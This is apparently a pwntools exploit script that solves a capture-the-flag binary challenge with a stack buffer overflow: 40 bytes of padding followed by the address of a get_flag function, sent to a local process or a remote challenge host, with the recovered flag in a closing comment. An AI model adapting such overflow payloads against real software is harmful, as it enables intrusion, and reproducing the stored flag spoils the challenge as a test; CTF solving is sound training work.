#!/usr/bin/env python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+40


        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('p0wn3d3.kctf-453514-codelab.kctf.cloud', 1337)
else:
    p = process([exe.path])
GDB()

p0 = b'a'*40 + p64(exe.sym.get_flag)
sla(b'before\n',p0)

p.interactive()
#wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}